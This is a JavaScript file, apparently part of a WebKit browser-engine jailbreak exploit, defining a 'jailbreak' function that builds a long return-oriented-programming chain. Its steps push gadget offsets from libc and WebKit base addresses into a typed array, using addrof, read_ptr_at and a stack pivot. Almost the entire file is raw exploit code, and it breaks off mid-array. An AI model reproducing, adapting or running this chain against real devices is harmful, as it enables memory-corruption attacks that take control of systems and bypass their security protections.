function jailbreak(){
var ropchain_array = new Uint32Array(99932);
var ropchain = read_ptr_at(addrof(ropchain_array)+0x10);
var ropchain_offset = 2;
function set_gadget(val)
{
    ropchain_array[ropchain_offset++] = val | 0;
    ropchain_array[ropchain_offset++] = (val / 4294967296) | 0;
}
function set_gadgets(l)
{
    for(var i = 0; i < l.length; i++)
        set_gadget(l[i]);
}
function db(data)
{
    for(var i = 0; i < data.length; i++)
        ropchain_array[ropchain_offset++] = data[i];
}
var main_ret = malloc(8);
var printf_buf = malloc(65536);
var __swbuf_addr = 0; 
ropchain_offset = 2;
set_gadgets([
libc_base+788575, 
ropchain+65720, 
webkit_base+14461559, 
libc_base+206806, 
ropchain+65680, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
ropchain+112, 
libc_base+471355, 
libc_base+811575, 
ropchain+315216, 
libc_base+811575, 
ropchain+65680 
]);
var printf_buf_offset = 128;
ropchain_offset = 32;
set_gadget(printf_buf);
db([4294967295, 4294967295]); 
ropchain_offset += 16384;
set_gadgets([
libc_base+882884, 
libc_base+793877, 
main_ret,
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
pivot_addr,
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+65800, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+65888, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+65920, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadget(webkit_base+432898,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+66008, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+66024, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+270800, 
libc_base+793877, 
ropchain+66184, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+66152, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+66136, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([16, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+66240, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+66344, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+66376, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+66360, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+66536, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+66504, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+66488, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+66640, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+66624, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+792472 
]);
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([8, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877546, 
libc_base+793877, 
ropchain+66848, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+66816, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+66952, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+66936, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+67032, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+67136, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+67152, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+270800, 
libc_base+793877, 
ropchain+67312, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+67280, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+67264, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([16, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+67368, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+67472, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+67504, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+67488, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+67664, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+67632, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+67616, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+67768, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+67752, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+792472 
]);
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([8, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+67968, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+67936, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([32, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+68072, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+68056, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877568, 
libc_base+793877, 
ropchain+68184, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+68152, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([48, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+68248, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+68304, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+75236, 
libc_base+793877, 
ropchain+68448, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+68464, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+68432, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+68584, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+68600, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+68568, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+68696, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+68712, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+68824, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+68808, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+68912, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+68896, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+69008, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+69024, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+69136, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+69120, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+69208, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+69296, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+69328, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadget(webkit_base+432898,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+69416, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+69432, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+69584, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+69616, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+69600, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+69568, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+69712, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+69696, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+792472 
]);
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([24, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+69912, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+69880, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([32, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+70016, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+70000, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877568, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+70104, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+70208, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+70224, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+70376, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+70408, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+70392, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+70360, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+70504, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+70488, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+792472 
]);
db([16711680, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+70616, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+5202439, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+792472 
]);
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([8, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+70848, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+70816, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([32, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+70952, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+70936, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877568, 
libc_base+793877, 
ropchain+71008, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+71064, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+75236, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+71176, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+71280, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+71296, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+71448, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+71480, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+71464, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+71432, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+71576, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+71560, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+792472 
]);
db([65280, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+71688, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+5202439, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+792472 
]);
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([8, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877546, 
libc_base+793877, 
ropchain+71872, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+71928, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+75236, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+72040, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+72144, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+72160, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+72312, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+72344, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+72328, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+72296, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+72440, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+72424, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+792472 
]);
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([24, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877546, 
libc_base+793877, 
ropchain+72592, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+72648, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+75236, 
libc_base+793877, 
ropchain+72784, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+72752, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([32, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+72912, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+72928, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+72896, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+73024, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+73040, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+73152, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+73136, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+73240, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+73224, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+73336, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+73352, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+73464, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+73448, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+73536, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+73600, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+73680, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+73752, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967284, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+73888, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+793877, 
ropchain+73944, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+73992, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967284, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+74096, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+74112, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+74264, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+74296, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+74280, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+74248, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+74368, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+74384, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+74480, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+74464, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+74560, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([4, 0]); 
set_gadget(libc_base+788575,); 
db([4, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+74712, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+74728, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+74696, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
webkit_base+48555, 
libc_base+269973, 
libc_base+793877, 
ropchain+74896, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+74912, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+74880, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+75016, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+75064, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+75032, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+75176, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+75168, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+75192, 
